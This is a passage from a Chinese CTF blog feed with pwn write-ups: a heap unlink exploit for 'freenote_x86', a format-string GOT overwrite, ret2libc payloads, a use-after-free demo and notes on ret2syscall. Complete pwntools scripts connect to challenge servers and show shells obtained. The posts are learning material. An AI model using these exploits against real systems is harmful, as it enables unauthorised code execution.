&apos;/root/pwnprac/freenote_x86&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h2 id="思路-有点迷"><a href="#思路-有点迷" class="headerlink" title="思路(有点迷)"></a>思路(有点迷)</h2><p>   首先分配5个大小为0x80的内存块（0,1,2,3,4），之后按顺序free掉3号与1号（这样1号内存的fd指针会指向3号），这样0号内存块就可以使用1号内存块的pre_size 与size 位，但我们可以<br>edit 0号内存块大小为0x90，目的是为了在对齐机制的情况下，系统会分配0x100大小的内存块，但因为需要输入申请内存大小的内容，所以只要0x90，即<br>刚好覆盖1号内存块的pre_size与size位，此时可以打印出1号内存块的fd指针，从而泄露出堆的基地址与0号内存的地址。<br>    之后unlink，因为delete漏洞的存在，1号块可以double free,将0号块卸下。这样子就可以对0号块为所欲为。(不太懂怎么为所欲为的) </p><h2 id="exp（待参透）"><a href="#exp（待参透）" class="headerlink" title="exp（待参透）"></a>exp（待参透）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">context.terminal = [&apos;terminator&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">local = 0</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">    cn = process(&quot;./freenote_x86&quot;)</span><br><span class="line">    bin = ELF(&quot;freenote_x86&quot;)</span><br><span class="line">    libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span><br><span class="line">else:</span><br><span class="line">    cn = remote(&apos;pwn2.jarvisoj.com&apos;,9885)</span><br><span class="line">    bin = ELF(&quot;freenote_x86&quot;)</span><br><span class="line">    libc = ELF(&quot;libc-2.19.so&quot;)</span><br><span class="line"></span><br><span class="line">def list_post():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def add_post(length,content):</span><br><span class="line">    cn.sendline(&apos;2&apos;)</span><br><span class="line">    cn.recvuntil(&apos;Length&apos;)</span><br><span class="line">    cn.sendline(str(length))</span><br><span class="line">    cn.recvuntil(&apos;Enter&apos;)</span><br><span class="line">    cn.sendline(content)</span><br><span class="line"></span><br><span class="line">def edit_post(idx,length,content):</span><br><span class="line">    cn.sendline(&apos;3&apos;)</span><br><span class="line">    cn.recvuntil(&apos;number&apos;)</span><br><span class="line">    cn.sendline(str(idx))</span><br><span class="line">    cn.recvuntil(&apos;Length&apos;)</span><br><span class="line">    cn.sendline(str(length))</span><br><span class="line">    cn.recvuntil(&apos;Enter&apos;)</span><br><span class="line">    cn.sendline(content)</span><br><span class="line"></span><br><span class="line">def del_post(idx):</span><br><span class="line">    cn.sendline(&apos;4&apos;)</span><br><span class="line">    cn.recvuntil(&apos;number&apos;)</span><br><span class="line">    cn.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">#chunk_list=0x0804A2EC</span><br><span class="line">#test=0x08048CC5</span><br><span class="line"></span><br><span class="line">#-------init-------</span><br><span class="line">for i in range(5):</span><br><span class="line">    add_post(0x80,str(i)*0x80)</span><br><span class="line"></span><br><span class="line">del_post(3)</span><br><span class="line">del_post(1)</span><br><span class="line"></span><br><span class="line">pay = &apos;0&apos;*0x80 + &apos;a&apos;*0x8</span><br><span class="line">edit_post(0,0x88,pay)</span><br><span class="line">#------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#--------leak----------</span><br><span class="line">cn.sendline(&apos;1&apos;)</span><br><span class="line">cn.recvuntil(&apos;a&apos;*0x8)</span><br><span class="line">leak_addr = u32(cn.recv(4))</span><br><span class="line">cn.recv()</span><br><span class="line">heap_base = leak_addr - 0xdb0#offset</span><br><span class="line">chunk0_addr = heap_base + 0x18</span><br><span class="line">success(&quot;leak_addr: &quot;+hex(leak_addr))</span><br><span class="line">success(&quot;heap_base: &quot;+hex(heap_base))</span><br><span class="line">success(&quot;chunk0_addr: &quot;+hex(chunk0_addr))</span><br><span class="line">#----------------------</span><br><span class="line"></span><br><span class="line">#-------unlink--------</span><br><span class="line">pay = p32(0x88) + p32(0x80) + p32(chunk0_addr-0xc) + p32(chunk0_addr-0x8) + &apos;0&apos;*(0x80-4*4)</span><br><span class="line">pay += p32(0x80) + p32(0x88+0x88)</span><br><span class="line">edit_post(0,len(pay),pay)</span><br><span class="line">del_post(1)</span><br><span class="line">#----------------------</span><br><span class="line"></span><br><span class="line">#--------leak----------</span><br><span class="line">pay = p32(2) + p32(1) + p32(0x88) + p32(chunk0_addr-0xc)</span><br><span class="line">pay += p32(1)+p32(0x4)+p32(bin.got[&apos;strtol&apos;])</span><br><span class="line">pay += &apos;\x00&apos;*(0x88-len(pay))</span><br><span class="line">edit_post(0,len(pay),pay)</span><br><span class="line">cn.sendline(&apos;1&apos;)</span><br><span class="line">cn.recvuntil(&apos;0. &apos;)</span><br><span class="line">cn.recvuntil(&apos;1. &apos;)</span><br><span class="line">strtol = cn.recvuntil(&apos;\x0a&apos;)[:-1]</span><br><span class="line">cn.recv()</span><br><span class="line">strtol = u32(strtol)</span><br><span class="line">system = strtol - libc.symbols[&apos;strtol&apos;]+libc.symbols[&apos;system&apos;]</span><br><span class="line">success(&quot;strtol: &quot;+hex(strtol))</span><br><span class="line">success(&quot;system: &quot;+hex(system))</span><br><span class="line">#----------------------</span><br><span class="line"></span><br><span class="line">#--------hijack&amp;getshell--------</span><br><span class="line">edit_post(1,4,p32(system))</span><br><span class="line">cn.sendline(&quot;$0&quot;)</span><br><span class="line">#----------------------</span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure><p>获得shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Your choice: $ whoami</span><br><span class="line">ctf</span><br><span class="line">$</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>pwn-300-Formatting string vulnerability</title>
      <link href="/2018/09/11/pwn-300%E8%A7%A3%E6%9E%90-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A9%E5%9B%BA/"/>
      <url>/2018/09/11/pwn-300%E8%A7%A3%E6%9E%90-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A9%E5%9B%BA/</url>
      <content type="html"><![CDATA[<p><em>pwn-300之前有一道pwn-200，也具有canary保护及NX保护，但是直接给了system(‘/bin/sh’)的函数，所以问题的关键就在于如何使程序转向该函数地址执行；幸运的是该程序同时具有格式化字符串漏洞。所以最后的思路就是，第一次输入，格式化字符串漏洞泄露canary，第二次输入溢出到函数返回地址即可。</em><br><em>而这道题将输入由gets变为fgets，也就是即使泄露出canary也无法溢出利用（canary必定以/x00结尾），同时没有了现成的system(‘/bin/sh’)函数。</em></p><h1 id="查看内容及保护"><a href="#查看内容及保护" class="headerlink" title="查看内容及保护"></a>查看内容及保护</h1><h2 id="main函数为："><a href="#main函数为：" class="headerlink" title="main函数为："></a>main函数为：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [esp+Ch] [ebp-4Ch]</span><br><span class="line">  unsigned int v5; // [esp+4Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(0x14u);  //canary生成</span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);</span><br><span class="line">  fgets(&amp;s, 64, stdin);   //fgets,遇/x00停止</span><br><span class="line">  printf(&amp;s);             //格式化字符串漏洞</span><br><span class="line">  fgets(&amp;s, 64, stdin);</span><br><span class="line">  printf(&amp;s);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="查看文件保护"><a href="#查看文件保护" class="headerlink" title="查看文件保护"></a>查看文件保护</h2><p>仍然是canary 与 栈不可执行；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@xuewenjie-kali:~/tikool# checksec binary_300</span><br><span class="line">[*] &apos;/root/tikool/binary_300&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h2 id="查看加载函数"><a href="#查看加载函数" class="headerlink" title="查看加载函数"></a>查看加载函数</h2><p>发现system函数</p><figure class="image-box">                <img src="/2018/09/11/pwn-300解析-格式化字符串漏洞利用巩固/system.png" alt="加载函数" title="" class="">                <p>加载函数</p>            </figure><h1 id="确定思路"><a href="#确定思路" class="headerlink" title="确定思路"></a>确定思路</h1><p>想到可以使用格式化字符串覆盖某个函数的got表地址，看下程序流程，想到可以覆盖printf函数的got地址，在第二次输入’/bin/sh’，原先的printf(/bin/sh)就会变成system(/bin/sh)，获取shell；</p><h1 id="流程实现"><a href="#流程实现" class="headerlink" title="流程实现"></a>流程实现</h1><h2 id="确定字符串位置"><a href="#确定字符串位置" class="headerlink" title="确定字符串位置"></a>确定字符串位置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@xuewenjie-kali:~/tikool# ./binary_300</span><br><span class="line">aaaa%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x </span><br><span class="line">aaaa00000040.f7f285c0.00000000.00000000.00000000.00000000.61616161.78383025.3830252e</span><br></pre></td></tr></table></figure><p>即字符串位于第六（相对于<strong>）或第七个（相对于</strong>）</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./binary_300&apos;)</span><br><span class="line">sh = remote(&apos;bamboofox.cs.nctu.edu.tw&apos;,22003)</span><br><span class="line">libc = ELF(&apos;./binary_300&apos;)</span><br><span class="line"></span><br><span class="line">printf_got = libc.got[&apos;printf&apos;]</span><br><span class="line">system_add = libc.symbols[&apos;system&apos;]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(7, &#123;printf_got: system_add&#125;)  //pwntools自带，用于生成格式化字符串payload；</span><br><span class="line"></span><br><span class="line">print payload</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>成功获得shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ /bin/sh</span><br><span class="line">$ whoami</span><br><span class="line">ctf</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> format </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn 1.3--ret2libc practice</title>
      <link href="/2018/08/28/pwn-%E5%85%A5%E9%97%A81-3-plt-got/"/>
      <url>/2018/08/28/pwn-%E5%85%A5%E9%97%A81-3-plt-got/</url>
      <content type="html"><![CDATA[<h1 id="关于ret2libc-中的plt-got"><a href="#关于ret2libc-中的plt-got" class="headerlink" title="关于ret2libc 中的plt/got"></a>关于ret2libc 中的plt/got</h1><h2 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h2><p>即当第一次使用某函数时，GOT表中对应表项保存的并不是真实的函数地址，需要通过_dl_runtime_resolve查找到真实的函数地址并填入GOT对应表项，从而在下次再使用该函数时，无需进行查找。我们要泄漏的就是初始化查找后填入GOT对应表项中的函数地址。</p><ul><li>使用gdb，断点下在write函数之后，运行，x查看write.plt.got处的值，即实际地址；*<br><img src="/2018/08/28/pwn-入门1-3-plt-got/write.png" alt="图四">    <img src="/2018/08/28/pwn-入门1-3-plt-got/wrgot.png" alt="图五"></li></ul><h2 id="plt-与-got"><a href="#plt-与-got" class="headerlink" title="plt 与 got"></a>plt 与 got</h2><p>文件的plt表中存放着函数的.plt.got 地址，.plt.got 地址处的值为该函数的真正的got地址（也就是我们需要泄露的）</p><p>由于延迟绑定机制的存在，我们只能通过泄露被调用的函数的got地址，同时又因为同一libc库中各函数之间的偏移是固定的，我们就能因此来求出其他函数的got地址。</p><h1 id="ret2libc的实现"><a href="#ret2libc的实现" class="headerlink" title="ret2libc的实现"></a>ret2libc的实现</h1><ol><li>文件给了一个pwnme文件与libc-2.19.so文件；checksec查看文件保护，IDA 查看源码，可以看到buf大小只有0x8，read却允许读入0x100大小的数据，有着明显的栈溢出；</li></ol><figure class="image-box">                <img src="/2018/08/28/pwn-入门1-3-plt-got/ida.png" alt="图一](pwn-入门1-3-plt-got/checksec.png)  ![图二" title="" class="">                <p>图一](pwn-入门1-3-plt-got/checksec.png)  ![图二</p>            </figure><ol start="2"><li>查看应用调用函数plt表，<code>objdump -d -M intel -j .plt pwnme</code>可以看到没有调用system，需要我们利用其它已调用的来泄露；</li></ol><figure class="image-box">                <img src="/2018/08/28/pwn-入门1-3-plt-got/plt.png" alt="图三" title="" class="">                <p>图三</p>            </figure><ol start="3"><li>这里决定泄露write函数的got地址：使用pwntools，使程序运行完write函数，得到真实的got地址；</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwn = ELF(&apos;pwnme&apos;) </span><br><span class="line">sh.recvuntil(&apos;flag:&apos;) </span><br><span class="line">wri_got = pwn.got[&apos;write&apos;]</span><br></pre></td></tr></table></figure><ol start="4"><li>构造payload泄露write函数的实际地址</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pay = &apos;a&apos;*20 + p32(pwn.symbols[&apos;write&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(1) + p32(wri_got) + p32(4)</span><br></pre></td></tr></table></figure><ol start="4"><li>泄露libc中的system与/bin/sh地址</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(&apos;libc-2.19.so&apos;)</span><br><span class="line">sys_addr = wri_addr - libc.symbols[&apos;write&apos;] + libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh_addr = wri_addr - libc.symbols[&apos;write&apos;] + libc.search(&apos;/bin/sh&apos;).next()</span><br></pre></td></tr></table></figure><ol start="5"><li>构造payload </li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;a&apos;*20 + p32(sys_addr) + &apos;bbbb&apos; + p32(binsh_addr)</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn2.3--UAF</title>
      <link href="/2018/08/28/pwn-%E5%85%A5%E9%97%A82.3-UAF/"/>
      <url>/2018/08/28/pwn-%E5%85%A5%E9%97%A82.3-UAF/</url>
      <content type="html"><![CDATA[<h1 id="堆的UAF-use-after-free-利用"><a href="#堆的UAF-use-after-free-利用" class="headerlink" title="堆的UAF(use after free)利用"></a>堆的UAF(use after free)利用</h1><p><em>学长介绍了某CTF大佬聚集的交流群，但是入群需要做题，题目本来不是我这个段位可以搞定的，但是怎么说？有压力就有动力:)抱着入群的信念，<br>先看了misc，结果需要修复pyc文件，按流程走的时候出现了无法解决的一个奇怪问题，遂放弃；之后看了下pwn，感觉甚难；在看了逆向完全不会之后，<br>只能看了下pwn的tips，开始现学现卖。</em></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>就像它的名字一样，即一个内存块被释放后再次被使用；主要利用的是一个指针对应的内存块被释放后，对应的指针没有被设为NULL；<br>而如果在这个指针在下一次被使用之前对应的内存块仍未被修改，程序可能还会正常运转；而若被已经修改，则有可能被利用，UAF就是利用该漏洞。</p><ul><li>根本原因：应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放会内核。如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。</li></ul><h2 id="漏洞的简单利用"><a href="#漏洞的简单利用" class="headerlink" title="漏洞的简单利用"></a>漏洞的简单利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">typedef void (*func_ptr)(char *);</span><br><span class="line">void evil_fuc(char command[])</span><br><span class="line">&#123;</span><br><span class="line">system(command);</span><br><span class="line">&#125;</span><br><span class="line">void echo(char content[])</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%s&quot;,content);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    func_ptr *p1=(func_ptr*)malloc(4*sizeof(int));</span><br><span class="line">    printf(&quot;malloc addr: %p\n&quot;,p1);</span><br><span class="line">    p1[3]=echo;</span><br><span class="line">    p1[3](&quot;hello world\n&quot;);</span><br><span class="line">    free(p1); //在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针</span><br><span class="line">    p1[3](&quot;hello again\n&quot;); //p1指针未被置空,虽然free了,但仍可使用.只是其内存块是被标记为空闲状态</span><br><span class="line">    func_ptr *p2=(func_ptr*)malloc(4*sizeof(int));//malloc在free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来.</span><br><span class="line">    printf(&quot;malloc addr: %p\n&quot;,p2);</span><br><span class="line">    printf(&quot;malloc addr: %p\n&quot;,p1);//p2与p1指针指向的内存为同一地址</span><br><span class="line">    p2[3]=evil_fuc; //在这里将p1指针里面保存的echo函数指针覆盖成为了evil_func指针.</span><br><span class="line">    p1[3](&quot;/bin/sh&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终运行效果：</p><figure class="image-box">                <img src="/2018/08/28/pwn-入门2.3-UAF/Introduction" alt="result" title="to" class="">                <p>to</p>            </figure><p><em>漏洞的利用方法原理上与其相同，之后会再加上入群题的解题过程</em></p><p>学习借鉴文章来源：<a href="https://blog.csdn.net/qq_31481187/article/details/73612451?locationNum=10&amp;fps=1" target="_blank" rel="noopener">https://blog.csdn.net/qq_31481187/article/details/73612451?locationNum=10&amp;fps=1</a></p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn1.2</title>
      <link href="/2018/08/28/pwn-%E5%85%A5%E9%97%A81-2/"/>
      <url>/2018/08/28/pwn-%E5%85%A5%E9%97%A81-2/</url>
      <content type="html"><![CDATA[<h1 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h1><h2 id="ret2text-amp-ret2shellcode"><a href="#ret2text-amp-ret2shellcode" class="headerlink" title="ret2text &amp; ret2shellcode"></a>ret2text &amp; ret2shellcode</h2><p>当程序中存在打印flag的地址或是可以得到shell的地址，我们就可以想办法覆盖返回地址到其地址处。也就是ret2text.</p><p>若程序中有明显的溢出且无保护措施，我们可以自己写shellcode并覆盖返回地址至shellcode处改变程序流程。不过要注意写入shellcode的区域要有可执行权限，否则写了也白写。关于shellcode的布置可以查看<br><a href="&quot;https://www.siriuswhiter.tk/2018/07/26/the-art-0f-deploying-shellcode/&quot;">shellcode的布置</a></p><p>查看程序段的可读写执行情况：</p><ol><li><p>gdb：vmmap</p></li><li><p>./file &amp;  (后台运行，返回pid0）<br> cat  /proc/pid0/maps</p></li></ol><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>栈不可执行开启的情况下，我们可以在栈上写入gadgets，使通过系统中断执行系统调用，从而达到获取shell的目的；</p><p>查找gadget的方法：</p><pre><code>ROPgadget --binary ./fileROPgadget --binary file  --only &apos;pop|ret&apos; | grep eax     ROPgadget --binary  --opcode cd80c3（int 0x80 ; ret ）</code></pre><p><em><a href="syscalls.kernelgrok.com" title="src">linux下的系统调用</a>.</em></p><h1 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h1><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p>程序不是静态编译，通常就不会有int 0x80; ret2syscall 就无法实现，因而使用ret2libc。</p><h3 id="利用过程："><a href="#利用过程：" class="headerlink" title="利用过程："></a>利用过程：</h3><p>ASLR使得每次载入的函数地址（base）都不同；实际地址 Address = base +offset</p><p><em>若地址为 0xf…  则其一般为实际地址；</em></p><p>而各函数offset在libc库中是固定的；</p><ul><li>查看libc库版本：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd  ./file</span><br></pre></td></tr></table></figure><ul><li>寻找偏移地址 ：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -a  /lib32/libc.so.6 | grep gets@</span><br></pre></td></tr></table></figure><ul><li>目标是寻找libc 的 base :</li></ul><p>1.通过程序中的其他函数leak 程序libc的实际地址（Address）,base = Address - offset</p><p>2.从stack残渣中获取libc地址信息</p><h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><p>简而言之就是程序在未调用过该函数时，其got地址处的值不是其真实地址；当程序调用一次该函数后，真实地址才会被初始化，此时got地址处的值才是真实地址。</p><h2 id="给文件加载目标libc的方法："><a href="#给文件加载目标libc的方法：" class="headerlink" title="给文件加载目标libc的方法："></a>给文件加载目标libc的方法：</h2><ol><li>加载环境变量:(64为UBUNTU调试32位程序会无法加载)</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export LD_LIBRARY_PATH=`pwd`       #当前目录为加载目录</span><br><span class="line">export LD_PRELOAD= libc            #加载本地pwn题目下的libc</span><br><span class="line"></span><br><span class="line">unset LD_PRELOAD                   #调试完删除环境变量</span><br></pre></td></tr></table></figure><ol start="2"><li>exp调试时使用</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh = process([‘./bin‘],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.23.so&quot;&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>软件保护/软件破解 及对抗</title>
      <link href="/2018/08/25/%E8%BD%AF%E4%BB%B6%E4%BF%9D%E6%8A%A4-%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3-%E5%8F%8A%E5%AF%B9%E6%8A%97/"/>
      <url>/2018/08/25/%E8%BD%AF%E4%BB%B6%E4%BF%9D%E6%8A%A4-%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3-%E5%8F%8A%E5%AF%B9%E6%8A%97/</url>
